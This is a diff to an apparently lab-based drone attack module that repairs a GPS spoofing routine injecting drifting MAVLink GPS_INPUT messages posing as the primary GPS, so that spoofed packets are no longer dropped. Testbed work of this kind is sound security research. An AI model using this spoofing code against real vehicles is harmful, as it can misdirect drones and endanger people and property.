@@ -12,6 +12,7 @@ Each attack carries P/N/T effect flags used by the case-study sheet and UI:
 from __future__ import annotations
 
 import os
+import sys
 import time
 
 from pymavlink import mavutil
@@ -205,6 +206,21 @@ def _disable_sim_gps(logf) -> None:
                 pass
 
 
+def _gps_input_has_yaw(conn) -> bool:
+    """True if this link's GPS_INPUT message defines the v2-only ``yaw`` field.
+
+    The gateway can flip pymavlink's active dialect between MAVLink v1 (18
+    fields, no yaw) and v2 (19 fields, yaw). We inspect the connection's own
+    encoder module rather than the process-global ``mavutil.mavlink`` so the arg
+    count always matches the packet actually being built.
+    """
+    try:
+        mod = sys.modules[conn.mav.__class__.__module__]
+        return "yaw" in mod.MAVLink_gps_input_message.fieldnames
+    except Exception:
+        return True  # assume modern v2 if introspection fails
+
+
 def gps_spoofing(duration_s: float, logf=log):
     """Inject drifting GPS_INPUT seeded from the live vehicle pose.
 
@@ -234,36 +250,30 @@ def gps_spoofing(duration_s: float, logf=log):
         vn = vn0 + v_walk
         ve = ve0 + v_walk
         vd = vd0
+        # GPS_INPUT has a trailing `yaw` field in MAVLink v2 (19 fields) but NOT
+        # in v1 (18 fields). Starting the proactive gateway flips pymavlink's
+        # global dialect to v1, so a fixed 19-arg call — and the old "fallback"
+        # that still passed yaw — raised "required argument is not an integer"
+        # and every injected packet was silently dropped (sent 0). Build the
+        # 18 shared args and append yaw only when this link's message defines it.
+        gps_args = [
+            int(time.time() * 1e6),           # time_usec
+            0,                                # gps_id (compete as GPS0 / primary)
+            0,                                # ignore_flags (keep lat/lon/alt/vel)
+            0, 0,                             # time_week_ms, time_week
+            3,                                # fix_type 3D
+            int((base_lat + drift) * 1e7),
+            int((base_lon + drift) * 1e7),
+            float(alt),
+            0.5, 0.5,                         # hdop vdop (good)
+            float(vn), float(ve), float(vd),
+            0.4, 0.4, 0.6,                    # accuracies
+            12,                               # satellites_visible
+        ]
+        if _gps_input_has_yaw(m.conn):
+            gps_args.append(0)                # yaw (v2 only), int (uint16)
         try:
-            # ignore_flags: don't ignore lat/lon/alt/vel (0)
-            m.conn.mav.gps_input_send(
-                int(time.time() * 1e6),  # time_usec
-                0,                       # gps_id (compete as GPS0 / primary)
-                0,                       # ignore_flags
-                0, 0,                    # time_week_ms, time_week
-                3,                       # fix_type 3D
-                int((base_lat + drift) * 1e7),
-                int((base_lon + drift) * 1e7),
-                float(alt),
-                0.5, 0.5,                # hdop vdop (good)
-                float(vn), float(ve), float(vd),
-                0.4, 0.4, 0.6,           # speed accuracy
-                12,                      # satellites_visible
-                0.0,                     # yaw
-            )
-        except TypeError:
-            # Older pymavlink signature without yaw
-            try:
-                m.conn.mav.gps_input_send(
-                    int(time.time() * 1e6), 0, 0, 0, 0, 3,
-                    int((base_lat + drift) * 1e7),
-                    int((base_lon + drift) * 1e7),
-                    float(alt), 0.5, 0.5,
-                    float(vn), float(ve), float(vd),
-                    0.4, 0.4, 0.6, 12, 0)
-            except Exception as exc:  # noqa: BLE001
-                logf("gps_spoofing", f"gps_input unsupported: {exc}")
-                break
+            m.conn.mav.gps_input_send(*gps_args)
         except Exception as exc:  # noqa: BLE001
             logf("gps_spoofing", f"gps_input unsupported: {exc}")
             break
